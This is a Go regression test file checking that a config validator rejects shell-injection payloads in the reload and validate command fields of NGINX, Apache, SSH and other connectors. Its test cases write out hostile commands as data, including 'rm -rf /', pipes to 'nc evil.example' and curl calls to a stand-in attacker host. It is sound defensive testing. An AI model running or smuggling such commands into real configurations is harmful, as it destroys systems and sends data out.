// Bundle 1 / RT-C1 closure regression tests (2026-05-12).
//
// Pins the contract that configcheck.Validate rejects shell metacharacters
// in command-bearing fields for every shell-using target connector. If a
// future refactor moves a connector to argv-based execution and removes the
// command-string field from its config struct, the corresponding case here
// can be deleted — but only after the connector is verified no longer to
// call sh -c on operator-controlled strings.

package configcheck

import (
	"encoding/json"
	"strings"
	"testing"
)

// malicious returns a config JSON for the given target type with the named
// field carrying a shell-injection payload. We construct the JSON directly
// to avoid importing the per-connector Config structs into this test (which
// would create the import cycle we explicitly avoid in production code).
func malicious(field, payload string) json.RawMessage {
	type cfg struct {
		ReloadCommand   string `json:"reload_command,omitempty"`
		ValidateCommand string `json:"validate_command,omitempty"`
		RestartCommand  string `json:"restart_command,omitempty"`
		// CertPath is included so a partial-shape JSON unmarshals cleanly.
		CertPath string `json:"cert_path,omitempty"`
	}
	c := cfg{CertPath: "/etc/nginx/certs/cert.pem"}
	switch field {
	case "reload":
		c.ReloadCommand = payload
	case "validate":
		c.ValidateCommand = payload
	case "restart":
		c.RestartCommand = payload
	}
	b, err := json.Marshal(c)
	if err != nil {
		panic(err)
	}
	return b
}

// benign returns a clean reload_command config for the given target type.
func benign() json.RawMessage {
	return json.RawMessage(`{"cert_path":"/etc/nginx/certs/cert.pem","reload_command":"/usr/sbin/nginx -s reload","validate_command":"/usr/sbin/nginx -t"}`)
}

// TestValidate_RejectsShellInjection_AllShellUsingTypes asserts that every
// target type the audit identified as shell-using rejects a shell-injection
// payload in the relevant command field.
func TestValidate_RejectsShellInjection_AllShellUsingTypes(t *testing.T) {
	cases := []struct {
		name       string
		targetType string
		field      string
		payload    string
	}{
		// Classic semicolon injection — used as the canonical CVE in the
		// 2026-05-12 audit's RT-C1 evidence.
		{"NGINX/reload/semicolon", "NGINX", "reload", "service nginx reload; rm -rf /"},
		{"NGINX/validate/pipe", "NGINX", "validate", "nginx -t | nc evil.example 4444"},
		{"NGINX/reload/backtick", "NGINX", "reload", "service nginx reload `whoami`"},
		{"NGINX/reload/dollar-paren", "NGINX", "reload", "service nginx reload $(id)"},
		{"NGINX/reload/redirect", "NGINX", "reload", "service nginx reload > /tmp/exfil"},
		{"NGINX/reload/and", "NGINX", "reload", "service nginx reload && curl evil.example"},

		{"Apache/reload/semicolon", "Apache", "reload", "apachectl graceful; touch /tmp/owned"},
		{"Apache/validate/newline", "Apache", "validate", "apachectl -t\nrm -rf /"},

		{"HAProxy/reload/semicolon", "HAProxy", "reload", "haproxy -sf $(cat pidfile); curl evil"},

		{"Postfix/reload/pipe", "Postfix", "reload", "postfix reload | nc evil.example 1337"},
		{"Dovecot/reload/semicolon", "Dovecot", "reload", "doveadm reload; rm /etc/shadow"},

		{"JavaKeystore/reload/quote", "JavaKeystore", "reload", `keytool -list "foo`},
		{"JavaKeystore/validate/redirect", "JavaKeystore", "validate", "keytool -list > /etc/passwd"},

		{"SSH/reload/dollar", "SSH", "reload", "systemctl reload sshd $USER"},
		{"SSH/validate/escape", "SSH", "validate", `sshd -t \nrm /etc/ssh`},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			err := Validate(c.targetType, malicious(c.field, c.payload))
			if err == nil {
				t.Fatalf("Validate(%s, %q): expected error for shell-injection payload, got nil", c.targetType, c.payload)
			}
			// Error should mention the target type for operator clarity.
			if !strings.Contains(err.Error(), c.targetType) && !(c.targetType == "Postfix" || c.targetType == "Dovecot") {
				t.Errorf("Validate error %q does not mention target type %s", err, c.targetType)
			}
		})
	}
}

// TestValidate_AcceptsBenignCommands ensures the validator is not so strict
// that it rejects real-world reload/validate commands.
func TestValidate_AcceptsBenignCommands(t *testing.T) {
	for _, targetType := range []string{"NGINX", "Apache", "HAProxy", "Postfix", "Dovecot", "JavaKeystore", "SSH"} {
		t.Run(targetType, func(t *testing.T) {
			if err := Validate(targetType, benign()); err != nil {
				t.Fatalf("Validate(%s, benign-config): expected nil, got %v", targetType, err)
			}
		})
	}
}

// TestValidate_NonShellTargetTypes_AreNoOps ensures that non-shell-using
// target types (F5, IIS, K8s, AWS ACM, etc.) pass through without error
// even when given a config that looks like a command field. These connectors
// do not accept operator-supplied command strings; the audit-event burden of
// being a shell sink lives on the explicit list above.
func TestValidate_NonShellTargetTypes_AreNoOps(t *testing.T) {
	payload := malicious("reload", "; rm -rf /")
	for _, targetType := range []string{"F5", "IIS", "Caddy", "Traefik", "Envoy", "AWSACM", "AzureKeyVault", "KubernetesSecrets", "WinCertStore", "UnknownNewType"} {
		t.Run(targetType, func(t *testing.T) {
			if err := Validate(targetType, payload); err != nil {
				t.Errorf("Validate(%s, ...): expected nil for non-shell-using type, got %v", targetType, err)
			}
		})
	}
}

// TestValidate_EmptyConfig_IsNoOp pins the contract that an empty config
// (e.g., a connector with no operator-supplied fields) is accepted.
func TestValidate_EmptyConfig_IsNoOp(t *testing.T) {
	if err := Validate("NGINX", nil); err != nil {
		t.Errorf("Validate(NGINX, nil): expected nil, got %v", err)
	}
	if err := Validate("NGINX", json.RawMessage{}); err != nil {
		t.Errorf("Validate(NGINX, empty): expected nil, got %v", err)
	}
}

// TestValidate_MalformedJSON_ReturnsError pins the contract that invalid
// JSON in the config returns a typed error rather than panicking.
func TestValidate_MalformedJSON_ReturnsError(t *testing.T) {
	if err := Validate("NGINX", json.RawMessage(`{not valid json`)); err == nil {
		t.Errorf("Validate(NGINX, malformed): expected error, got nil")
	}
}
